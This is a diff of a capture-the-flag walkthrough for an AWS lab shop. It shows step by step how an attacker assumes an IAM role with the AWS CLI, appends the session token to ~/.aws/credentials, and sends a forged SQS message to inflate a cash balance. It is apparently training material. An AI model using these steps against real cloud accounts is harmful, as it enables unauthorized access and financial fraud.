@@ -1,15 +1,13 @@
-1. The attacker accesses the web page and identifies the features first
   
+1. The attacker accesses the web page and identifies the features first
     [ page ] → what can do  
     /        → User can buy items.  
     /receipt → User can see the purchase.  
-    /charge  → User can charge the cash.
-
-
-
+    /charge  → User can charge the cash.  
   
+---
+
 2. The attacker checks the privileges it has
-  
     ```bash
     # This command will configure AWS CLI settings for a specific profile, allowing you to set credentials
     aws configure --profile [profile_name]
@@ -22,44 +20,43 @@
     ```  
     ※ Attacker finds that they have assume-role privileges for a particular role.  
     ※ Attacker looks for clues about how to attack using this privilege.
-  
+   
+---  
 
-      
-4. Find the web source code. By analyzing the source code, the attacker checks the format of message sent to the SQS service
+3. Find the web source code. By analyzing the source code, the attacker checks the format of message sent to the SQS service
   
     ※ The website has a github address exposed as an annotation.  
     → https://github.com/BoB12-C-G-V/FLAG-Shop
   
-    < Code Analysis Results >- When charging the cash, a message is sent to the SQS service.  
-    - The lambda function does not verify the received message.  
-    - The message format is `{"charge_amount" : cash}`  
+    < Code Analysis Results >  
+  -When charging the cash, a message is sent to the SQS service.  
+  -The lambda function does not verify the received message.  
+  -The message format is `{"charge_amount" : cash}`  
   
     ※ Attacker plans to forge the cache and send message to the SQS service.  
   
+---  
 
-  
-5. Assume the the sending message role about SQS service
-    
+4. Assume the the sending message role about SQS service
     ```bash
     # This command will get you credentials for the role that can send message to SQS service
     aws --profile [profile_user] sts assume-role --role-arn [role_arn] --role-session-name [whatever_you_want_here]
     # This command will configure AWS CLI settings for a specific profile, allowing you to set credentials 
     aws configure --profile [assumed_profile_name]
     # This command will appends the obtained session token to the ~/.aws/credentials file
-    echo "aws_session_token = {얻은 토큰}" >> ~/.aws/credentials
-    ```
-
-
+    echo "aws_session_token = {token}" >> ~/.aws/credentials
+    ```  
   
-6. The attacker, who possesses the necessary permissions, sends a forged message to the SQS service queue
-    
+---  
+  
+5. The attacker, who possesses the necessary permissions, sends a forged message to the SQS service queue  
     ```bash
     # This command wil get you queue-url of SQS service
     aws --profile [assumed_profile_name] sqs get-queue-url --queue-name cash_charging_queue
     # This command wil sends a forged message to the SQS service queue
     aws --profile [assumed_profile_name] sqs send-message --queue-url [queue_url] --message-body '{"charge_amount": 100000000}'
-    ```
-
-
+    ```  
   
-7. Check the changed assets, purchase FLAG and check the secret-string
+---  
+  
+6. Check the changed assets, purchase FLAG and check the secret-string
